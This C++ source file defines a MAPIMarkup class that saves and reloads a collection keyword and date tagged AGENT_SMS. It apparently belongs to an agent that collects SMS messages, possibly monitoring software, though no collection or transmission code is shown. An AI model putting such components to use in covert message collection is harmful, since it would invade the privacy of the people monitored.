#include "MAPIMarkup.h"
#include "Conf.h"
#include "Log.h"

MAPIMarkup::MAPIMarkup(void)
  : _lpwCollectKeyword(NULL)
{
}

MAPIMarkup::~MAPIMarkup(void)
{
  if (_lpwCollectKeyword)
    LocalFree(_lpwCollectKeyword);
}

bool MAPIMarkup::IsCollectCompletedForKeyword(LPWSTR lpwKeyword)
{
  if (wcscmp(lpwKeyword, _lpwCollectKeyword) == 0)
    return true;
  return false;
}

bool MAPIMarkup::SetDate( FILETIME ftDate )
{
  _ftDate = ftDate;
  return true;
}

bool MAPIMarkup::SetKeyword(LPWSTR lpwKeyword)
{
  if (_lpwCollectKeyword)
  {
    LocalFree(_lpwCollectKeyword);
    _lpwCollectKeyword = NULL;
  }

  _lpwCollectKeyword = (LPWSTR) LocalAlloc(LPTR, (wcslen(lpwKeyword) + 1) * sizeof(WCHAR));
  if (_lpwCollectKeyword == NULL)
    return false;

  StringCchCopy(_lpwCollectKeyword, wcslen(lpwKeyword) + 1, lpwKeyword);

  return true;
}

bool MAPIMarkup::Write()
{
  if (_lpwCollectKeyword == NULL)
    return true;

  MAPISerializer<MAPIMarkupType> serializer;

  UINT cbSize = 0;
  LPBYTE pData = (LPBYTE) LocalAlloc(LPTR, 
    serializer.SerializedWStringLength(_lpwCollectKeyword) + serializer.SerializedObjectLength(sizeof(_ftDate)));
  
  LPBYTE ptr = pData;
  ptr += serializer.SerializeWString(ptr, _lpwCollectKeyword, MAPIMARKUP_COLLECT_KEYWORD);
  ptr += serializer.SerializeObject(ptr, (LPBYTE)&_ftDate, sizeof(FILETIME), MAPIMARKUP_COLLECT_FROMDATE);
  cbSize = ptr - pData;
  
  Log* pLog = new Log();
  pLog->WriteMarkup(AGENT_SMS, pData, cbSize);
  delete pLog;

  return true;
}

bool MAPIMarkup::Read()
{    
  UINT cbSize = 0;
  Log* pLog = new Log();
  LPBYTE pData = pLog->ReadMarkup(AGENT_SMS, &cbSize);
  delete pLog;
  
  if (cbSize == 0)
    return false;
  
  if (pData && cbSize > 0)
  {
    MAPISerializer<MAPIMarkupType> serializer;
    
    DWORD cbBytesToGo = cbSize;
    LPBYTE ptr = pData;

    while (ptr < pData + cbSize)
    {
      DWORD prefix = 0;
      ptr += serializer.ReadPrefix(ptr, &prefix);
      
      DWORD type = PREFIX_TYPE(prefix);
      DWORD size = PREFIX_SIZE(prefix);
      
      switch (type)
      {
      case MAPIMARKUP_COLLECT_KEYWORD:
        ptr += serializer.UnserializeWString(ptr, size, &_lpwCollectKeyword);
        break;
      case MAPIMARKUP_COLLECT_FROMDATE:
        LPBYTE lpftDate = (LPBYTE)&_ftDate;
        ptr += serializer.UnserializeObject(ptr, size, (LPBYTE*)&lpftDate);
        break;
      }
    }
  } else {
    return false;
  }
  
  return true;
}

bool MAPIMarkup::IsMarkup()
{
  Log* pLog = new Log();

  BOOL present = pLog->IsMarkup(AGENT_SMS);
  if (present == FALSE)
    return false;

  return true;
}
